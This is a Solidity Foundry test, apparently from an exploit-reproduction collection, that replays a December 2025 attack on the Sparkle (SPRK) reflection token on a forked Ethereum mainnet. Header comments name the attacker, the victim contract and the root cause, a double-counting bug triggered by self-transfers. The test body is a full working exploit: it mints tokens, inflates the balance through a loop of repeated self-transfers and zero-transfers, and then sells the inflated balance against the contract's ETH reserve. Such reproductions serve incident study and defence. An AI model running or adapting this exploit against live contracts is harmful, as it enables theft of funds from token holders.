// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~$14.6K (TenArmor); this PoC nets ~4.49 ETH at attack-block prices
// Attacker : https://etherscan.io/address/0x6c8ec8f14be7c01672d31cfa5f2cefeab2562b50
// Attack Contract / MEV : https://etherscan.io/address/0xf0c8d5c861161bdffb5e83e14ff573bdc9275960
// Vulnerable Contract : https://etherscan.io/address/0x286ae10228c274a9396a05a56b9e3b8f42d1ce14 (Sparkle! SPRK)
// Attack Tx : https://etherscan.io/tx/0xa3d09b92d29c60dcd2056077d5e8995334ec278fec93fc30bc60eddd5e002f53

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x286ae10228c274a9396a05a56b9e3b8f42d1ce14#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/2009479460853305659
// Hacking God : N/A
// Root cause : Tobin-tax / reflection token double-counts unclaimed redistribution on
//              self-transfer because balanceOf() is applied into _balances before
//              _tobinsClaimed is updated, then balanceOf() is applied again for the
//              recipient (same address). Repeated self-transfer + zero-transfer inflates
//              balance; sellSparkle() redeems inflated balance against the ETH reserve
//              at fixed COST_PER_TOKEN.
// Tags : vuln/logic/incorrect-calculation · vuln/defi/fee-manipulation · vuln/logic/incorrect-state-transition

interface ISPRK {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function sellSparkle(uint256 amount) external returns (bool);
    function mintSparkle() external payable returns (bool);
    function totalSupply() external view returns (uint256);
    function tobinsCollected() external view returns (uint256);
}

contract SPRK_exp is BaseTestWithBalanceLog {
    ISPRK constant SPRK = ISPRK(0x286ae10228C274a9396a05A56B9E3B8f42D1cE14);
    // Attack block (Dec 27 2025) minus one
    uint256 constant BLOCK_NUM = 24_101_439 - 1;

    function setUp() public {
        // Prefer ETH_RPC_URL archive; foundry.toml [rpc_endpoints].mainnet as fallback name.
        string memory rpc = vm.envOr("ETH_RPC_URL", string("https://eth.llamarpc.com"));
        vm.createSelectFork(rpc, BLOCK_NUM);
        fundingToken = address(0); // native ETH profit (balanceLog zeros ETH; re-deal in test)
    }

    function testExploit() public balanceLog {
        // balanceLog deals 0 ETH when fundingToken==0; fund after that snapshot.
        vm.deal(address(this), 20 ether);
        uint256 ethBefore = address(this).balance;
        console.log("SPRK ETH reserve before", address(SPRK).balance);

        // 1) Seed position via fixed-price mint (same economic role as attack flashloan mint)
        SPRK.mintSparkle{value: 5 ether}();
        console.log("SPRK bal after mint", SPRK.balanceOf(address(this)));

        // 2) Self-transfer loop: each non-zero transfer double-applies unclaimed Tobin
        //    share (tax is added to _tobinsCollected AFTER _tobinsClaimed is written, so
        //    residual unclaimed remains). Zero-transfer realizes state like the live attack.
        for (uint256 i; i < 55; i++) {
            uint256 b = SPRK.balanceOf(address(this));
            // value + 2% tax must fit in balanceOf
            uint256 amt = (b * 100) / 102;
            SPRK.transfer(address(this), amt);
            SPRK.transfer(address(this), 0);
        }

        uint256 inflated = SPRK.balanceOf(address(this));
        console.log("SPRK bal after inflate", inflated);

        // 3) Redeem against ETH reserve at fixed COST_PER_TOKEN (1e14 wei ETH per 1e18 SPRK)
        //    reward = amount * 1e14 / 1e18; leave headroom for 3% creator fee on sell path
        uint256 maxByEth = (address(SPRK).balance * 95) / 100 * 1e4;
        uint256 sellAmt = inflated > maxByEth ? maxByEth : inflated;
        SPRK.sellSparkle(sellAmt);

        uint256 profit = address(this).balance - ethBefore;
        console.log("ETH profit wei", profit);
        console.log("SPRK reserve left", address(SPRK).balance);
        require(profit > 1 ether, "expected multi-ETH profit");
    }

    receive() external payable {}
}
